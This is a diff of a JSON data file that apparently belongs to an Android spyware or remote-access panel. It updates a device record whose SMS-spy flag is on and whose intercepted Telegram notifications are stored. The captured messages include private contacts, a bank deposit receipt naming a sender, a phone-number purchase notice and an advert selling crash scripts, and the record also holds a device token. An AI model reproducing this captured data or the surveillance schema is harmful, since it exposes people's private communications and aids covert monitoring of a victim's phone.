@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777068014310,
+    "lastSeen": 1777068020291,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ᴄᴏᴡᴡꜱ ᴘᴀʀᴋᴇʀ 🕷️",
+        "content": "Pesan Suara",
+        "time": "25/04 05:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777068021926
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / ADITYA ABDULLAH\n🏦 Method: SEABANK\n💰 Amount: Rp 8.800\n💸 Fee: Rp 235\n💵 Total Payload: Rp 9.035\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260424054620255249\n🏷️ System ID: FSCL88281507\n⏰ 25 Apr 2026 • 04:47 WIB\n\n#DEPOSIT #SEABANK",
+        "time": "25/04 05:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777068015632
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
+        "content": "\n✅ [AUTO-CHECK CPU] - V1 ✅\n\nTotal Server yang Dicek: 18\n\nSemua server yang dicek berada dalam batas CPU wajar.",
+        "time": "25/04 05:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777068015620
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -3995,30 +4019,6 @@
         "time": "25/04 03:16",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1777061798379
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: 🜲 𝐖𝐎𝐋𝐊𝐄𝐑 𝐂𝐑𝐀𝐒𝐇 🜲 𝙊𝙈 𝘿𝙄𝙏𝙕𝙕𝙓𝙋𝙍𝙀𝙈 ⸙ 𝐓𝟓",
-        "content": "🖼 ╔════════════════════\n║ ⧼ 𝐖𝐎𝐋𝐊𝐄𝐑 𝐂𝐑𝐀𝐒𝐇 ⧽\n╠════════════════════\n║ ⧼ 𝐋𝐈𝐒𝐓 𝐇𝐀𝐑𝐆𝐀 𝐒𝐂𝐑𝐈𝐏𝐓 ⧽\n╠════════════════════\n║⌬ FREE UPDATE: Rp 15.000/15K\n║⌬ RESELLER: Rp 35.000/35K\n║⌬ PARTNER: Rp 55.000/55K\n║⌬ MODERATOR: Rp 70.000/70K\n║⌬ CEO: Rp 85.000/80K\n║⌬ OWNER: Rp 100.000/100K\n╠…",
-        "time": "25/04 03:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777061798306
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5690 pesan baru dari 51 obrolan",
-        "time": "25/04 03:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777061798189
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******16\n• Waktu: 25/04/2026, 03.13",
-        "time": "25/04 03:16",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777061798171
       }
     ],
     "galleryPhotos": [],
